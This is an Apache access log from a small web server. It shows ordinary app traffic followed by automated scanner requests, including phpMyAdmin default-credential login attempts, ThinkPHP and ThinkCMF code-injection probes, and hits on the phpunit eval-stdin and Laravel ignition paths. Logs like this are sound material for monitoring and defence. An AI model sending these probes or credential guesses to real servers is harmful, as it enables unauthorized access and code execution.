91.166.71.69 - - [30/Mar/2021:12:07:33 +0200] "GET /secureX/gethint.php?q=hello HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:07:32 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:07:34 +0200] "GET /secureX/gethint.php?q=hello HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:07:38 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:38 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
::1 - - [30/Mar/2021:12:07:41 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
99.81.180.203 - - [30/Mar/2021:12:07:43 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:07:41 +0200] "GET /secureX/gethint.php?q=hell HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:42 +0200] "GET /secureX/gethint.php?q=hel HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:42 +0200] "GET /secureX/gethint.php?q=he HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:42 +0200] "GET /secureX/gethint.php?q=h HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:43 +0200] "GET /secureX/gethint.php?q=b HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:43 +0200] "GET /secureX/gethint.php?q=by HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:43 +0200] "GET /secureX/gethint.php?q=bye HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:44 +0200] "GET /secureX/gethint.php?q=bye HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:44 +0200] "GET /secureX/gethint.php?q=bye%20b HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:07:43 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:07:44 +0200] "GET /secureX/gethint.php?q=bye%20by HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:44 +0200] "GET /secureX/gethint.php?q=bye%20bye HTTP/1.1" 200 362 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:45 +0200] "GET /secureX/gethint.php?q=bye%20bye HTTP/1.1" 200 363 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:07:48 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 230 "-" "Go-http-client/1.1"
::1 - - [30/Mar/2021:12:07:51 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
99.81.180.203 - - [30/Mar/2021:12:07:49 +0200] "GET /secureX/set_secureX_action.php?value=10 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
::1 - - [30/Mar/2021:12:07:52 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:12:07:53 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:12:07:54 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:12:07:55 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:12:07:57 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
91.166.71.69 - - [30/Mar/2021:12:08:04 +0200] "GET /secureX/gethint.php?q=l HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:08:04 +0200] "GET /secureX/gethint.php?q=lo HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:08:04 +0200] "GET /secureX/gethint.php?q=log HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:08:05 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:08:05 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:08:06 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
::1 - - [30/Mar/2021:12:08:13 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
99.81.180.203 - - [30/Mar/2021:12:08:58 +0200] "GET /secureX/reset_secureX_action.php HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:08:59 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 231 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:09:02 +0200] "GET /secureX/ HTTP/1.1" 200 1207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:02 +0200] "GET /secureX/action.js HTTP/1.1" 200 584 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:02 +0200] "GET /secureX/bootstrap/css/bootstrap.css HTTP/1.1" 200 17074 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:02 +0200] "GET /secureX/jquery.min.js HTTP/1.1" 200 33669 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:02 +0200] "GET /secureX/images/secureX-1.png HTTP/1.1" 200 341486 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:02 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:08:59 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:09:05 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:09:05 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:09:10 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:09:11 +0200] "GET /secureX/gethint.php?q=n HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:11 +0200] "GET /secureX/gethint.php?q=ny HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:11 +0200] "GET /secureX/gethint.php?q=nye HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:09:10 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:09:12 +0200] "GET /secureX/gethint.php?q=ny HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:12 +0200] "GET /secureX/gethint.php?q=n HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:13 +0200] "GET /secureX/gethint.php?q=by HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:13 +0200] "GET /secureX/gethint.php?q=by HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:13 +0200] "GET /secureX/gethint.php?q=bye HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:14 +0200] "GET /secureX/gethint.php?q=bye HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:09:16 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 233 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:09:14 +0200] "GET /secureX/gethint.php?q=bye%20by HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:14 +0200] "GET /secureX/gethint.php?q=bye%20by HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:14 +0200] "GET /secureX/gethint.php?q=bye%20bye HTTP/1.1" 200 362 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:09:15 +0200] "GET /secureX/gethint.php?q=bye%20bye HTTP/1.1" 200 362 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:09:16 +0200] "GET /secureX/set_secureX_action.php?value=999 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
::1 - - [30/Mar/2021:12:09:21 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
99.81.180.203 - - [30/Mar/2021:12:09:22 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 230 "-" "Go-http-client/1.1"
::1 - - [30/Mar/2021:12:09:22 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:12:09:24 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
99.81.180.203 - - [30/Mar/2021:12:09:22 +0200] "GET /secureX/set_secureX_action.php?value=10 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
::1 - - [30/Mar/2021:12:09:27 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
91.166.71.69 - - [30/Mar/2021:12:09:29 +0200] "GET /secureX/gethint.php?q=bye%20bye HTTP/1.1" 200 363 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
::1 - - [30/Mar/2021:12:09:36 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
91.166.71.69 - - [30/Mar/2021:12:18:24 +0200] "GET /secureX/ HTTP/1.1" 200 1207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:24 +0200] "GET /secureX/action.js HTTP/1.1" 200 583 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:24 +0200] "GET /secureX/jquery.min.js HTTP/1.1" 200 33669 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:24 +0200] "GET /secureX/images/secureX-1.png HTTP/1.1" 304 184 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:24 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:28 +0200] "GET /secureX/gethint.php?q=l HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:29 +0200] "GET /secureX/gethint.php?q=lo HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:30 +0200] "GET /secureX/gethint.php?q=log HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:30 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 2058 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:18:30 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 2058 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:18:34 +0200] "GET /secureX/reset_secureX_action.php HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:18:34 +0200] "GET /secureX/reset_secureX_action.php HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
password= HTTP/1.1" 200 12577 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=root&pma_password=bitnami HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=root&pma_password=root HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 6727 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.99.105.115 - - [01/Apr/2021:06:07:10 +0200] "GET /phpmyadmin/index.php?pma_username=test&pma_password=test HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
68.183.91.173 - - [01/Apr/2021:07:01:48 +0200] "POST /_ignition/execute-solution HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:50 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:51 +0200] "GET / HTTP/1.1" 200 276 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:53 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:53 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:53 +0200] "GET /manager/html HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:54 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
68.183.91.173 - - [01/Apr/2021:07:01:54 +0200] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 200 271 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
::1 - - [01/Apr/2021:07:02:00 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
186.33.112.71 - - [01/Apr/2021:07:50:44 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
186.33.114.6 - - [01/Apr/2021:08:02:18 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
194.61.25.4 - - [01/Apr/2021:08:46:05 +0200] "\x03" 400 0 "-" "-"
193.29.13.47 - - [01/Apr/2021:08:49:11 +0200] "\x03" 400 0 "-" "-"
139.59.235.12 - - [01/Apr/2021:08:50:12 +0200] "GET / HTTP/1.1" 200 253 "-" "-"
186.226.5.80 - - [01/Apr/2021:10:05:06 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
139.162.238.243 - - [01/Apr/2021:10:08:48 +0200] "GET / HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.128.112.14 - - [01/Apr/2021:11:21:58 +0200] "\x03" 400 0 "-" "-"
143.110.209.125 - - [01/Apr/2021:11:41:00 +0200] "HEAD / HTTP/1.0\n" 400 0 "-" "-"
143.110.209.125 - - [01/Apr/2021:11:41:00 +0200] "GET /system_api.php HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:01 +0200] "GET /system_api.php HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:01 +0200] "GET /c/version.js HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:01 +0200] "GET /streaming/clients_live.php HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:01 +0200] "GET /stalker_portal/c/version.js HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:01 +0200] "GET /client_area/ HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:02 +0200] "GET /stalker_portal/c/ HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.110.209.125 - - [01/Apr/2021:11:41:02 +0200] "GET /stream/rtmp.php HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
205.185.122.102 - - [01/Apr/2021:12:03:31 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
64.62.197.92 - - [01/Apr/2021:12:47:04 +0200] "GET / HTTP/1.1" 200 253 "-" "-"
185.202.0.11 - - [01/Apr/2021:13:24:24 +0200] "\x03" 400 0 "-" "-"
193.118.53.194 - - [01/Apr/2021:13:27:15 +0200] "GET / HTTP/1.1" 200 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:21 +0200] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:21 +0200] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:21 +0200] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:22 +0200] "GET /_ignition/execute-solution HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:22 +0200] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
